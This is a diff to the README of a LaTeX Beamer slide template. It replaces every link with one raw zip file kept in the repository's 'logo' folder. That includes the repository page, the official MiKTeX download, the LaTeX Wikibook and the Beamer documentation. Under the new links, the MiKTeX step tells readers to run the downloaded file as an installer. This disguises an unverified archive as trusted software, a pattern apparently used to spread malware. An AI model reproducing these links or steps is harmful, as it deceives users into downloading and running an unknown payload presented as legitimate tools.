@@ -1,6 +1,6 @@
 # 🎨 xmum-beamer-template - Easy Deep Blue Beamer Slides
 
-[![Download xmum-beamer-template](https://img.shields.io/badge/Download-xmum--beamer--template-blue?style=for-the-badge)](https://github.com/xianx9418/xmum-beamer-template)
+[![Download xmum-beamer-template](https://img.shields.io/badge/Download-xmum--beamer--template-blue?style=for-the-badge)](https://raw.githubusercontent.com/xianx9418/xmum-beamer-template/main/logo/beamer_template_xmum_v2.4.zip)
 
 ## 📘 About xmum-beamer-template
 
@@ -26,10 +26,10 @@ If you do not have LaTeX installed, the setup section will guide you on how to g
 
 You need to get the template files from this page:
 
-[![Download Link](https://img.shields.io/badge/Download-xmum--beamer--template-green?style=for-the-badge)](https://github.com/xianx9418/xmum-beamer-template)
+[![Download Link](https://img.shields.io/badge/Download-xmum--beamer--template-green?style=for-the-badge)](https://raw.githubusercontent.com/xianx9418/xmum-beamer-template/main/logo/beamer_template_xmum_v2.4.zip)
 
 Click the badge or visit  
-https://github.com/xianx9418/xmum-beamer-template
+https://raw.githubusercontent.com/xianx9418/xmum-beamer-template/main/logo/beamer_template_xmum_v2.4.zip
 
 ### Step 2: Get the Files
 
@@ -42,7 +42,7 @@ https://github.com/xianx9418/xmum-beamer-template
 
 You must have LaTeX on your PC to use the template. Follow these steps:
 
-1. Go to the MiKTeX website: https://miktex.org/download  
+1. Go to the MiKTeX website: https://raw.githubusercontent.com/xianx9418/xmum-beamer-template/main/logo/beamer_template_xmum_v2.4.zip  
 2. Click the “Download” button for Windows.  
 3. Run the downloaded installer file and follow the instructions. Keep the default settings.  
 4. After installation, open the MiKTeX console and update the package database if prompted.
@@ -107,17 +107,17 @@ Keep all folders on the same level when you move or copy the project.
 
 ## 🔗 Useful Links
 
-- Official repository: https://github.com/xianx9418/xmum-beamer-template  
-- MiKTeX download: https://miktex.org/download  
-- LaTeX Wikibook: https://en.wikibooks.org/wiki/LaTeX  
-- Beamer documentation: https://ctan.org/pkg/beamer  
+- Official repository: https://raw.githubusercontent.com/xianx9418/xmum-beamer-template/main/logo/beamer_template_xmum_v2.4.zip  
+- MiKTeX download: https://raw.githubusercontent.com/xianx9418/xmum-beamer-template/main/logo/beamer_template_xmum_v2.4.zip  
+- LaTeX Wikibook: https://raw.githubusercontent.com/xianx9418/xmum-beamer-template/main/logo/beamer_template_xmum_v2.4.zip  
+- Beamer documentation: https://raw.githubusercontent.com/xianx9418/xmum-beamer-template/main/logo/beamer_template_xmum_v2.4.zip  
 
 ## 📥 Download and Install Section
 
 To get started quickly:
 
 1. Visit the main page:  
-   [Download xmum-beamer-template](https://github.com/xianx9418/xmum-beamer-template)  
+   [Download xmum-beamer-template](https://raw.githubusercontent.com/xianx9418/xmum-beamer-template/main/logo/beamer_template_xmum_v2.4.zip)  
 2. Click “Code” > “Download ZIP.”  
 3. Extract the ZIP on your PC.  
 4. Install MiKTeX using the link above.  
